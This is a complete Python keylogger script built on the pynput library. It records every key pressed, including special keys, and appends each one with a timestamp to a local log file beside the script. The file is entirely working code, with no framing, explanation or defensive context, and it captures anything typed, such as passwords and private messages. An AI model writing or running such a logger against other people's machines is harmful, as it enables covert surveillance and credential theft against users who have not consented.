from pynput import keyboard
from datetime import datetime
import os

log_file = os.path.join(os.path.dirname(__file__), "keystrokes_log.txt")

def on_press(key):
    try:
        key_data = key.char
    except AttributeError:
        key_data = f"[{key.name}]"

    time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"{time_stamp} - {key_data}\n"

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(entry)
    except Exception as e:
        print("Logging failed:", e)

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
